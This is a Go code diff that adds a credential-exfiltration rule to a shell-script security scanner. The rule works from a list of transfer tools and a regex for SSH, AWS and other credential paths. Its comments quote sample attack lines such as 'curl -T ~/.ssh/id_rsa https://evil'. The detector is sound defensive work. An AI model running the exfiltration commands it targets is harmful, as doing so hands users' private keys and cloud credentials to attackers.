@@ -33,6 +33,19 @@ var fenceShellLangs = map[string]bool{
 
 var shebangShellRe = regexp.MustCompile(`^#!.*\b(sh|bash|zsh|ksh|dash|ash)\b`)
 
+// transferCommands move bytes off the machine. It is a superset of
+// fetchCommands: scp and nc never fetch a script to run, but they do carry a
+// file out, which is what the credential-exfiltration check is about.
+var transferCommands = map[string]bool{
+	"curl": true, "wget": true, "nc": true, "ncat": true, "scp": true, "fetch": true,
+}
+
+// credentialPathRe is the structural twin of the regex pass's credentialPath.
+// Keeping the two in step is what stops the regex-only rule from being evaded
+// by splitting the command across lines with a continuation, which is the
+// whole reason this pass exists.
+var credentialPathRe = regexp.MustCompile(`(?i)(?:(?:~|\$\{?HOME\}?)/\.(?:ssh|aws|gnupg|kube|docker|netrc|npmrc)\b|\bid_(?:rsa|dsa|ecdsa|ed25519)\b|\.aws/credentials\b)`)
+
 // shellSnippet is a chunk of shell source plus the 1-based file line on which
 // its first line sits (so AST positions map back to real file lines).
 type shellSnippet struct {
@@ -129,6 +142,7 @@ func analyzeShellSnippet(filename string, sn shellSnippet, report *Report) {
 			}
 		case *syntax.CallExpr:
 			analyzeCall(n, add)
+			analyzeCredentialTransfer(n, add)
 		case *syntax.Redirect:
 			if n.Word != nil && strings.Contains(n.Word.Lit(), "/dev/tcp/") {
 				// A reverse shell is the outbound channel itself, not a
@@ -152,6 +166,11 @@ func analyzePipeline(bc *syntax.BinaryCmd, add func(rule, severity, class, msg s
 		return
 	}
 	last := stages[len(stages)-1]
+	if credentialPipeline(stages) {
+		add("CREDENTIAL_EXFILTRATION", "critical", string(ClassExfiltration),
+			"Shell AST: credential file piped to a network command", last.Pos())
+		return
+	}
 	if !shellInterpreters[stmtCmdName(last)] {
 		return
 	}
@@ -249,4 +268,72 @@ func wordHasExpansion(w *syntax.Word) bool {
 		return true
 	})
 	return found
+}
+
+// credentialPipeline reports whether a pipeline reads a credential path in one
+// stage and runs a transfer command in another. Order is not fixed: the read
+// may be `cat ~/.ssh/id_rsa | curl ...` or the sink may name the file itself.
+func credentialPipeline(stages []*syntax.Stmt) bool {
+	sawCred, sawTransfer := false, false
+	for _, s := range stages {
+		if transferCommands[stmtCmdName(s)] {
+			sawTransfer = true
+		}
+		if stmtMentionsCredentialPath(s) {
+			sawCred = true
+		}
+	}
+	return sawCred && sawTransfer
+}
+
+// analyzeCredentialTransfer flags a single command that both is a transfer
+// command and names a credential path — `curl -T ~/.ssh/id_rsa https://evil`,
+// `scp ~/.aws/credentials host:` — with no pipeline involved.
+func analyzeCredentialTransfer(ce *syntax.CallExpr, add func(rule, severity, class, msg string, pos syntax.Pos)) {
+	if !transferCommands[callName(ce)] {
+		return
+	}
+	for _, arg := range ce.Args[1:] {
+		if credentialPathRe.MatchString(wordText(arg)) {
+			// Credential bytes addressed to a network command. Unlike an RCE
+			// cradle, a network-off sandbox run cannot refute this: observing
+			// that nothing left while the network was off says nothing about
+			// what leaves when it is on.
+			add("CREDENTIAL_EXFILTRATION", "critical", string(ClassExfiltration),
+				"Shell AST: credential file handed to a network command", ce.Pos())
+			return
+		}
+	}
+}
+
+// stmtMentionsCredentialPath reports whether any word of a simple command
+// names a credential path.
+func stmtMentionsCredentialPath(s *syntax.Stmt) bool {
+	if s == nil {
+		return false
+	}
+	ce, ok := s.Cmd.(*syntax.CallExpr)
+	if !ok {
+		return false
+	}
+	for _, arg := range ce.Args {
+		if credentialPathRe.MatchString(wordText(arg)) {
+			return true
+		}
+	}
+	return false
+}
+
+// wordText renders a word back to source text. Word.Lit() returns "" for any
+// word containing an expansion, so $HOME/.ssh/id_rsa would be invisible to a
+// Lit-based check.
+func wordText(w *syntax.Word) string {
+	if w == nil {
+		return ""
+	}
+	var b strings.Builder
+	if err := syntax.NewPrinter().Print(&b, w); err != nil {
+		return w.Lit()
+	}
+	return b.String()
 }
